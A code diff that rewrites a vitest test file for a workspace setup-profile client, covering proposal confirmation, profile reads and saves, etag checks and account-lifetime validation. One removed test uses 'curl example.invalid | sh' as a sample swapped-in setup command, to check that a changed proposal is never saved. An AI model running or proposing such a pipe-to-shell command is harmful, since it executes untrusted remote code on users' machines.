@@ -1,120 +1,38 @@
-import { beforeEach, describe, expect, it, vi } from "vitest";
-import { computerSteps, decideProposal, proposedSetup, settleProposal } from "./profile";
-
+import { afterEach, beforeEach, expect, it, vi } from "vitest";
+import { readSetupProfile, saveSetupProfile } from "./profile";
 const mocks = vi.hoisted(() => ({ api: vi.fn() }));
 vi.mock("../net/api", () => ({ api: mocks.api }));
-
-const stored = {
-  setup_command: "make deps",
-  pending_setup_command: "npm ci",
-  laptop_only: ["xcodebuild"],
-  deferred: ["open Simulator.app"],
-  missing_environment: ["API_BASE"],
-  future_field: { kept: true },
-};
-
-describe("a proposed setup command", () => {
-  it("is shown only when an agent proposed one", () => {
-    expect(proposedSetup({ setup_command: null, pending_setup_command: "npm ci", laptop_only: [], deferred: [], missing_environment: [] })).toBe("npm ci");
-    for (const pending of [undefined, null, "", "   "]) {
-      expect(proposedSetup({ setup_command: "make", pending_setup_command: pending, laptop_only: [], deferred: [], missing_environment: [] })).toBeNull();
-    }
-    expect(proposedSetup(null)).toBeNull();
-  });
-
-  it("confirming saves exactly the shown command and keeps every other field", () => {
-    expect(decideProposal(stored, "npm ci", "confirm")).toEqual({ ...stored, setup_command: "npm ci", pending_setup_command: null });
-  });
-
-  it("dismissing clears only the proposal", () => {
-    expect(decideProposal(stored, "npm ci", "dismiss")).toEqual({ ...stored, pending_setup_command: null });
-  });
-
-  it("never applies a decision to a proposal the user did not see", () => {
-    for (const decision of ["confirm", "dismiss"] as const) {
-      expect(decideProposal(stored, "npm install", decision)).toBeNull();
-      expect(decideProposal({ ...stored, pending_setup_command: undefined }, "npm ci", decision)).toBeNull();
-    }
-  });
+beforeEach(() => mocks.api.mockReset());
+afterEach(() => vi.restoreAllMocks());
+it("uses only the fixed profile route, exact original lifetime and read/save deadlines", async () => {
+  const timeout = vi.spyOn(AbortSignal, "timeout");
+  const lifetime = "a".repeat(64);
+  const profile = { pending_setup_command: null, future_field: { kept: true } };
+  const read = Response.json(profile, { headers: { etag: '\"original\"' } });
+  const saved = new Response(null, { status: 204 });
+  mocks.api.mockResolvedValueOnce(read).mockResolvedValueOnce(saved);
+  await expect(readSetupProfile("workspace/a?b", lifetime)).resolves.toBe(read);
+  await expect(saveSetupProfile("workspace/a?b", profile, '\"original\"', lifetime)).resolves.toBe(saved);
+  expect(timeout.mock.calls.map(([ms]) => ms)).toEqual([15_000, 35_000]);
+  const [[readPath, get], [savePath, put]] = mocks.api.mock.calls;
+  expect(readPath).toBe("/pro/profile?workspace_id=workspace%2Fa%3Fb");
+  expect(savePath).toBe(readPath); expect(get.cache).toBe("no-store"); expect(get.method).toBeUndefined();
+  expect(get.headers).toEqual({ "X-Chimaera-Account-Lifetime": lifetime });
+  expect(put.method).toBe("PUT"); expect(put.headers).toEqual({ "Content-Type": "application/json", "If-Match": '\"original\"', "X-Chimaera-Account-Lifetime": lifetime });
+  expect(JSON.parse(put.body)).toEqual(profile);
 });
-
-describe("steps that need the computer", () => {
-  const profile = (deferred: unknown) => ({ setup_command: null, laptop_only: [], deferred: deferred as string[], missing_environment: [] });
-  it("lists the kept steps in order and nothing else", () => {
-    expect(computerSteps(profile(["open Simulator.app", "xcodebuild test"]))).toEqual(["open Simulator.app", "xcodebuild test"]);
-    expect(computerSteps(profile(["", "  ", "nvidia-smi", 7, null]))).toEqual(["nvidia-smi"]);
-  });
-  it("is empty without a profile, an older daemon's shape or steps", () => {
-    for (const value of [null, undefined, profile([]), profile(undefined), profile("xcodebuild")]) expect(computerSteps(value)).toEqual([]);
-  });
+it("malformed captured lifetime causes zero API sends, without omission fallback", () => {
+  for (const lifetime of ["", "A".repeat(64), "a".repeat(63)]) {
+    expect(() => readSetupProfile("workspace-a", lifetime)).toThrow("account_changed");
+    expect(() => saveSetupProfile("workspace-a", {}, '\"original\"', lifetime)).toThrow("account_changed");
+  }
+  expect(mocks.api).not.toHaveBeenCalled();
 });
-
-describe("saving the decision", () => {
-  beforeEach(() => mocks.api.mockReset());
-  const noWait = () => Promise.resolve();
-
-  it("reads the stored profile fresh and writes the whole of it back", async () => {
-    mocks.api.mockResolvedValueOnce(Response.json(stored, { headers: { etag: '"revision-one"' } })).mockResolvedValueOnce(new Response(null, { status: 204 }));
-    await expect(settleProposal("w-1", "npm ci", "confirm", noWait)).resolves.toBe("saved");
-    const [[readPath, read], [writePath, write]] = mocks.api.mock.calls;
-    expect(readPath).toBe("/pro/profile?workspace_id=w-1");
-    expect(read.method).toBeUndefined();
-    expect(writePath).toBe(readPath);
-    expect(write.method).toBe("PUT");
-    expect(write.headers["If-Match"]).toBe('"revision-one"');
-    expect(JSON.parse(write.body)).toEqual({ ...stored, setup_command: "npm ci", pending_setup_command: null });
-  });
-
-  it("writes nothing when the proposal changed since it was shown", async () => {
-    mocks.api.mockResolvedValueOnce(Response.json({ ...stored, pending_setup_command: "curl example.invalid | sh" }));
-    await expect(settleProposal("w-1", "npm ci", "confirm", noWait)).resolves.toBe("changed");
-    expect(mocks.api).toHaveBeenCalledOnce();
-  });
-
-  it("retries a save refused mid-copy from a fresh read, then gives up", async () => {
-    const busy = () => Response.json({ error: "busy" }, { status: 409 });
-    mocks.api
-      .mockResolvedValueOnce(Response.json(stored, { headers: { etag: '"revision-one"' } })).mockResolvedValueOnce(busy())
-      .mockResolvedValueOnce(Response.json(stored, { headers: { etag: '"revision-one"' } })).mockResolvedValueOnce(new Response(null, { status: 204 }));
-    const wait = vi.fn(noWait);
-    await expect(settleProposal("w-1", "npm ci", "dismiss", wait)).resolves.toBe("saved");
-    expect(wait).toHaveBeenCalledOnce();
-    expect(mocks.api).toHaveBeenCalledTimes(4);
-
-    mocks.api.mockReset();
-    mocks.api.mockImplementation(async (_path: string, init: RequestInit = {}) => init.method === "PUT" ? busy() : Response.json(stored, { headers: { etag: '"revision-one"' } }));
-    await expect(settleProposal("w-1", "npm ci", "dismiss", noWait)).rejects.toThrow();
-    expect(mocks.api.mock.calls.filter(([, init]) => init.method === "PUT").length).toBeLessThanOrEqual(4);
-  });
-
-  it("requires a fresh decision after a revision refusal, even if the command text matches", async () => {
-    mocks.api.mockResolvedValueOnce(Response.json(stored, { headers: { etag: '\"old\"' } }))
-      .mockResolvedValueOnce(new Response(null, { status: 412 }));
-    await expect(settleProposal("w-1", "npm ci", "confirm", noWait)).resolves.toBe("changed");
-    expect(mocks.api).toHaveBeenCalledTimes(2);
-  });
-
-  it("does not carry a busy retry into a replacement account with the same profile", async () => {
-    mocks.api.mockResolvedValueOnce(Response.json(stored, { headers: { etag: '\"old-account\"' } }))
-      .mockResolvedValueOnce(new Response(null, { status: 409 }))
-      .mockResolvedValueOnce(Response.json(stored, { headers: { etag: '\"new-account\"' } }));
-    await expect(settleProposal("w-1", "npm ci", "confirm", noWait)).resolves.toBe("changed");
-    expect(mocks.api).toHaveBeenCalledTimes(3);
-  });
-
-  it("never overwrites a replaced proposal or an unversioned legacy profile", async () => {
-    mocks.api.mockResolvedValueOnce(Response.json(stored, { headers: { etag: '"old"' } }))
-      .mockResolvedValueOnce(new Response(null, { status: 412 }));
-    await expect(settleProposal("w-1", "npm ci", "confirm", noWait)).resolves.toBe("changed");
-    expect(mocks.api).toHaveBeenCalledTimes(2);
-    mocks.api.mockReset().mockResolvedValueOnce(Response.json(stored));
-    await expect(settleProposal("w-1", "npm ci", "confirm", noWait)).rejects.toThrow("profile_not_saved");
-    expect(mocks.api).toHaveBeenCalledOnce();
-  });
-
-  it("does not retry any other refusal", async () => {
-    mocks.api.mockResolvedValueOnce(Response.json(stored, { headers: { etag: '"revision-one"' } })).mockResolvedValueOnce(Response.json({ error: "denied" }, { status: 400 }));
-    await expect(settleProposal("w-1", "npm ci", "confirm", noWait)).rejects.toThrow();
-    expect(mocks.api).toHaveBeenCalledTimes(2);
-  });
+it("legacy fixed calls omit the optional lifetime and never retry a refusal", async () => {
+  const refusal = new Response(null, { status: 409 }); mocks.api.mockResolvedValue(refusal);
+  await expect(readSetupProfile("workspace-a")).resolves.toBe(refusal);
+  await expect(saveSetupProfile("workspace-a", {}, '\"original\"')).resolves.toBe(refusal);
+  expect(mocks.api).toHaveBeenCalledTimes(2);
+  expect(mocks.api.mock.calls[0][1].headers).toEqual({});
+  expect(mocks.api.mock.calls[1][1].headers).toEqual({ "Content-Type": "application/json", "If-Match": '\"original\"' });
 });
